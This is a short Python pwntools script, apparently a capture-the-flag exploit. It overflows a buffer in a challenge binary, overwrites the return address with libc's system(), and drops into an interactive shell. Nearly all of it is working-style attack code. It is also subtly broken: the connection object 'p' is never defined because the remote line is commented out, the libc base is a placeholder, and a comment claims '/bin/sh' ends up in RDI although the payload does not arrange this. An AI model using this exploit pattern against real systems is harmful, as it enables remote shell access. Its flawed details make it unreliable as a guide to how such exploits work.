from pwn import context, ELF, log, p64

context.log_level = 'debug'

elf = ELF('./chall')
libc = ELF('./libc.so.6')  # Use correct libc from Docker
# p = remote('server-ip', 1470)  # Change for local testing

# Step 1: Precomputed libc base from Docker environment
libc_base = 0x7ffff7dc0000  # Example, adjust based on Docker libc

# Step 2: Calculate system() address
system_addr = libc_base + libc.symbols['system']
log.success(f"Using system() at: {hex(system_addr)}")

# Step 3: Overflow vuln() and return to system()
payload = b"/bin/sh\x00"  # This gets stored in RDI before ret
payload += b"A" * (40 - len(payload))  # Overflow buffer + saved RBP
payload += p64(system_addr)  # Overwrite return address with system()

p.sendlineafter('>', '3')  # Enter vuln()
p.sendlineafter(': ', payload)

p.interactive()  # Get shell

